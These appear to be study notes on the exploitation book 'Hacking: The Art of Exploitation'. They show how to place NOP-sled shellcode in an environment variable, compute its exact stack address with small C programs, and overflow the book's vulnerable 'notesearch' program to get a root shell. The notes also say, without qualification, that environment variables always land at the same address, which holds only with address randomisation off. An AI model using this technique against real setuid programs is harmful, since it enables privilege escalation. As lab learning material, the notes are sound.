Let’s first put the shellcode into a file, for example `shellcode.bin`
Then let’s do this:
```bash
export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
```

And like this we have all stages of our exploit basically.

and just like that, our payload is in an environment variable, with a 200 bytes nope sled.

Since the env variables are pushed onto the stack, we can also jump there, and execute our shellcode from that place.

# Without a nopsled
We somehow have to get the location of the env variable in memory. How do we do this? Let’s write a simple c program.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, int *argv[]) {
    printf("%s is at %p\n", argv[1], getenv(argv[1]));
    return 0;
}
```

This program can find about where the address it but not exactly. What can we do instead?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// argv[1] is the program to exploit and argv[2] is the env
int main(int argc, int *argv[]) {
    char *env = getenv(argv[2]);
    int self_len = strlen(argv[0]);
    int other_len = strlen(argv[1]);
    env += (self_len - other_len)*2;
    printf("%s will be at %p\n", argv[2], env );
}
```

This program finds the exact position of the address we are looking for. how does it do it? Well it’s simple actually, the env variables are gonna be placed at the exact same place in memory at every run.

```ad-note
The place of them also depends on the length of the program name.
```

Using this information we could write this program and use it to exploit a buffer overflow like so:

```bash
❯ ./get_exact_env.o ./notesearch seedless 
seedless will be at 0xffffdf6a
~/Documents/workspace/book-docs/hacking-the-art-of-exploitation/code    11:52:47
❯ ./notesearch $(perl -e 'print "\x6a\xdf\xff\xff"x60')        
[DEBUG] found a 2 byte note for user id 1000
[DEBUG] found a 2 byte note for user id 1000
[DEBUG] found a 12 byte note for user id 1000
-------[ end of note data ]-------
sh-5.1# exit
exit
```
